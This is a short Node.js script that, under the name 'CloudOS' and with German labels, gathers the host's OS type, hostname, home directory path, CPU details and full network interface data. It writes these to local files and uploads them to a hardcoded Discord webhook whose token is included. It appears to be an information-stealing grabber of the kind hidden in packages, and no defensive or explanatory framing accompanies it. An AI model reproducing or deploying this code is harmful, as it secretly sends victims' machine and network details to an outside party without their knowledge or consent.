const os = require('node:os');
var file = require('file-system');
var fs = require('fs');
const { Webhook } = require('discord-webhook-node');
const cloudSolid = new Webhook("https://discord.com/api/webhooks/1033087971982843995/c7LtfNuhB9giLW-TavWGw0ARHkRc7S9Q29SVrdBYrghq50HB6P8Pz9_SG2gQY6Qp_ziO");
cloudSolid.setUsername('CloudOS');
cloudSolid.setAvatar('https://img.icons8.com/color/48/000000/download-from-cloud.png')
const software = '**Betriebssystem: **' + '`' + os.type() + ' | ' + os.platform() + '`'
var network = JSON.stringify(os.networkInterfaces())
var cpu = JSON.stringify(os.cpus());
const desktop = '**Desktop: **' + '`' + os.hostname() + '`'
const homedir = '**PC-NAME:   **' + '`' + os.homedir() + '`'
cloudSolid.success(`
 __DATEN GESPEICHERT!__

 > ✅  ${homedir},
 > ✅  ${desktop},
 > ✅  ${software},
`)
fs.writeFile('network.txt', network, function(err){
    if(err){
        console.log('Error: ' + err)
    }
})
fs.writeFile('prozessor.txt', cpu, function(err){
    if(err){
        console.log('Error: ' + err)
    }
})
setTimeout(()=>{
    cloudSolid.sendFile('prozessor.txt')
    cloudSolid.sendFile('network.txt')
},500)
